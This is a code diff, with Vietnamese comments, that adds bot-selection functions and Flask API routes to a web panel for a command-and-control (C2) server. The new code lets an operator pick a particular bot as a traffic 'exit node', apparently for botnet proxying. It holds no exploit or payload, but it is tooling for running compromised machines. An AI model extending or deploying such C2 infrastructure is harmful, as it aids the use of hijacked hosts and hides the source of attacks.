@@ -129,6 +129,45 @@ class C2Client:
         except Exception as e:
             print(f"❌ Error getting connections: {e}")
             return []
+            
+    def select_bot(self, bot_id: str) -> bool:
+        """Chọn bot cụ thể làm exit node"""
+        if not self.connected:
+            return False
+            
+        try:
+            response = self.send_command(f"SELECT_BOT:{bot_id}")
+            return "✅" in response
+        except Exception as e:
+            print(f"❌ Error selecting bot: {e}")
+            return False
+            
+    def clear_preferred_bot(self) -> bool:
+        """Xóa bot ưu tiên"""
+        if not self.connected:
+            return False
+            
+        try:
+            response = self.send_command("CLEAR_PREFERRED_BOT")
+            return "✅" in response
+        except Exception as e:
+            print(f"❌ Error clearing preferred bot: {e}")
+            return False
+            
+    def get_preferred_bot(self) -> Dict:
+        """Lấy bot ưu tiên hiện tại"""
+        if not self.connected:
+            return {}
+            
+        try:
+            response = self.send_command("GET_PREFERRED_BOT")
+            if response:
+                return json.loads(response)
+            else:
+                return {}
+        except Exception as e:
+            print(f"❌ Error getting preferred bot: {e}")
+            return {}
 
 @app.route('/')
 def index():
@@ -368,6 +407,56 @@ def api_restart_server():
         if not ok:
             return jsonify({'error': 'Failed to restart'}), 500
         return jsonify({'message': 'Server restarted'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/select_bot', methods=['POST'])
+def api_select_bot():
+    """API chọn bot cụ thể làm exit node"""
+    global c2_client
+    if not c2_client or not c2_client.connected:
+        return jsonify({'error': 'Not connected to C2 server'}), 500
+    
+    try:
+        data = request.get_json()
+        bot_id = data.get('bot_id')
+        if not bot_id:
+            return jsonify({'error': 'bot_id is required'}), 400
+            
+        success = c2_client.select_bot(bot_id)
+        if success:
+            return jsonify({'message': f'Bot {bot_id} selected as preferred exit node'})
+        else:
+            return jsonify({'error': f'Failed to select bot {bot_id}'}), 500
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/clear_preferred_bot', methods=['POST'])
+def api_clear_preferred_bot():
+    """API xóa bot ưu tiên"""
+    global c2_client
+    if not c2_client or not c2_client.connected:
+        return jsonify({'error': 'Not connected to C2 server'}), 500
+    
+    try:
+        success = c2_client.clear_preferred_bot()
+        if success:
+            return jsonify({'message': 'Cleared preferred bot, using load balancer'})
+        else:
+            return jsonify({'error': 'Failed to clear preferred bot'}), 500
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/preferred_bot')
+def api_get_preferred_bot():
+    """API lấy bot ưu tiên hiện tại"""
+    global c2_client
+    if not c2_client or not c2_client.connected:
+        return jsonify({'error': 'Not connected to C2 server'}), 500
+    
+    try:
+        preferred_info = c2_client.get_preferred_bot()
+        return jsonify(preferred_info)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
